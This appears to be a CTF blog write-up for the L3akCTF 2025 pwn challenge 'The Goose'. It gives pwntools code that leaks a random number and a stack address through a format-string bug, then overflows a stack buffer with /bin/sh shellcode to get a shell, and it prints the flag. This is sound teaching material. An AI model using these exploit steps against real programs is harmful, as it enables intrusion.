---
title: The Goose
date: 2025-07-14T21:39:11+03:00
description: Writeup for The Goose [L3akCTF_2025s]
author: vikcoc
tags:
- pwn
draft: false
---
___

## Challenge Description

When the honking gets tough, you better brush up on your basics

## Intuition

Checking with pwndbg we see that we probably are expected to execute a shell payload from the stack.
```bash
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

## Solution

Sifting through the code with Ghidra we see that `highscore` is an interesting function
```C
  __isoc99_scanf(&DAT_001024eb,local_78);
  local_d9 = 0;
  sprintf(local_f8,(char *)&local_58,local_78);
  printf(local_f8);
```
There is a printf where we control the format string fallowed by a read of greater size than the stack frame.
```ASM
        001013bd 48 8d 85        LEA        RAX=>local_178,[RBP + -0x170]
                 90 fe ff ff
        001013c4 ba 00 04        MOV        EDX,0x400
                 00 00
        001013c9 48 89 c6        MOV        RSI,RAX
        001013cc bf 00 00        MOV        EDI,0x0
                 00 00
        001013d1 b8 00 00        MOV        EAX,0x0
                 00 00
        001013d6 e8 85 fc        CALL       <EXTERNAL>::read                                 ssize_t read(int __fd, void * __
                 ff ff
```
To get there though we must guess a random number generated by the process.\
The number is generated before we are asked to guess, which suggests, that it too, must be leaked.\
If we search for it at runtime, we can find it with the global variables, right after the username. Username that gets printed after the number is generated.
```python
position_of_leaked_rand = -18
print(target.sendlineafter(b'e call you?', b'a' * 0x40).decode())
line = target.recvuntil(b'?', timeout=2)
target.sendline(str(line[position_of_leaked_rand]).encode())
```
With a long username we get to leak the random value, which we send right back to get access to the `highscore` function.\
There we are asked to input another string, which gets to be the template string for printf, function that we can exploit to leak values on the stack[^1].
```python
print(target.sendlineafter(b'again?', b'%1$p').decode())
line = target.recvuntil(b'so good',timeout=2)
```
Turns out that, on position 1, there is a stack address which we can use to compute the value of `RBP`.\
After that it's just a matter of crafting a shellcode payload, which pwntools can provide.
```python
buffer_size = 0x170
binshlen = rbplen = 0x8
shell = pwn.asm(pwn.shellcraft.sh())
pay = b'/bin/sh\0' + shell + b'b' * (buffer_size - binshlen - len(shell)) + b'c' * rbplen + pwn.p64(rbpaddr - buffer_size + binshlen)
```
And read the flag with the shell.

### Flag

`L3AK{H0nk_m3_t0_th3_3nd_0f_l0v3}`

## References

[^1]: https://pagedout.institute/download/PagedOut_004_beta1.pdf page 54
